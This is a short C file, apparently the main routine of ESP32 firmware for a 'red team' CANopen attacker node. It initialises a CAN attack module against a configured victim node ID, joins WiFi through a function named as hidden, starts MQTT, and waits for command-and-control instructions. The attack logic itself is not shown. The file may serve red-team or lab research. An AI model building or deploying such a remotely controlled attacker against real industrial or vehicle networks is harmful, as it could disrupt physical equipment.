#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"

#include "config.h"
#include "wifi_mqtt.h"
#include "can_attack.h"

static const char *TAG = "RED_TEAM";

void app_main(void)
{
    ESP_LOGW(TAG, "================================");
    ESP_LOGW(TAG, " RED TEAM NODE - CANopen Attacker");
    ESP_LOGW(TAG, " Target Node-ID: 0x%02X", VICTIM_NODE_ID);
    ESP_LOGW(TAG, "================================");

    ESP_ERROR_CHECK(can_attack_init());

    if (wifi_init_sta_hidden() != ESP_OK) {
        ESP_LOGE(TAG, "WiFi failed - running offline");
    } else {
        ESP_ERROR_CHECK(mqtt_start());
    }

    ESP_LOGI(TAG, "Red team node ready, waiting for C2 commands");

    while (1) {
        vTaskDelay(pdMS_TO_TICKS(5000));
    }
}
